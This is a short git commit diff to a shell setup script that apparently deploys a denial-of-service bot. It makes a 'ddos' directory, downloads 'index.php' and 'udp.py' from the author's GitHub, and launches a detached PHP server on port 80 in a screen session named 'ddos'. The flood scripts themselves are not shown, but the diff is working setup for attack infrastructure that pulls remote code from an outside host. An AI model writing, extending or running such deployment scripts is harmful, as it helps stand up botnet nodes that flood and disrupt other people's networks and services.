36a79fc388ff23676abcceae2d6eaaa11a086e7b
ZeronX <160329349+zeronxdev@users.noreply.github.com>
2024-04-07 19:30:10 +0700

    up

--- bot/setup.sh
+++ bot/setup.sh
@@ -1,7 +1,11 @@
 yum update -y
 yum install python3 -y
 yum install php -y
-yum install wget -y
+yum install screen -y
 mkdir ddos
 cd ddos
-
+curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
+curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/udp.py -o udp.py
+screen -dmS ddos php -S 0.0.0.0:80
+ip_server=$(hostname -I)
+echo "Setup Success IP Server: $ip_server"
